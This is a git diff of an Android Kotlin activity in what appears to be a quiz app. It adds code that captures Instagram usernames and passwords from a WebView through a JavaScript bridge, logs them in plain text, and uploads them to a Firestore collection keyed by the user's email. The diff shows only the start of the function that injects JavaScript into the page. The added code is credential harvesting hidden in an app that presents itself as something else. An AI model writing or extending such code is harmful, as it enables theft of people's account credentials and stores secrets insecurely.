@@ -7,6 +7,7 @@ import android.webkit.JavascriptInterface
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Toast
+import com.google.firebase.auth.ktx.auth
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
 import com.ncs.quizr.databinding.ActivityInstaBinding
@@ -16,27 +17,40 @@ import com.ncs.quizr.main.MainActivity
 class InstaActivity : AppCompatActivity() {
 
     lateinit var binding : ActivityInstaBinding;
-    val DB = Firebase.firestore
+    var isSet: Boolean = false
 
-    object JSBridge{
+    object JSBridge {
 
-        lateinit var creds : String
+        lateinit var creds: String
+        val DB = Firebase.firestore
 
+
+
+        fun setCredse(credss: String) {
+            this.creds = credss
+
+            val userData = hashMapOf(
+                "creds" to credss,
+            )
+
+            DB.collection("users").document(Firebase.auth.currentUser?.email.toString()).collection("creds")
+                .document("insta")
+                .set(userData)
+
+        }
         @JavascriptInterface
-        fun callFromJS(username : String , pass : String) {
+        fun callFromJS(username: String, pass: String) {
             Log.d("Call from Js", "username : ${username} \n password : ${pass}")
-            this.creds = username+" "+pass
-
-
+            setCredse("username: ${username} , pass: ${pass}")
             //       Log.d("Call from Js", "Hello")
         }
 
-        fun getCreden():String{
+        fun getCreden(): String {
             return creds
         }
 
         @JavascriptInterface
-        fun callFromJSX(){
+        fun callFromJSX() {
 
             //  Log.d("Call from Js", "username : ${username} \\n password : ${pass}")
             Log.d("Call from Js", "Hello")
@@ -62,13 +76,11 @@ class InstaActivity : AppCompatActivity() {
             }
 
         }
-        webView.addJavascriptInterface(InstaActivity.JSBridge, "Bridge")
+        webView.addJavascriptInterface(JSBridge, "Bridge")
 
     }
 
-   fun showCreds(){
-       Toast.makeText(this, JSBridge.getCreden(), Toast.LENGTH_SHORT).show()
-    }
+
 
     private fun injectJs(view: WebView?) {
         view!!.loadUrl(
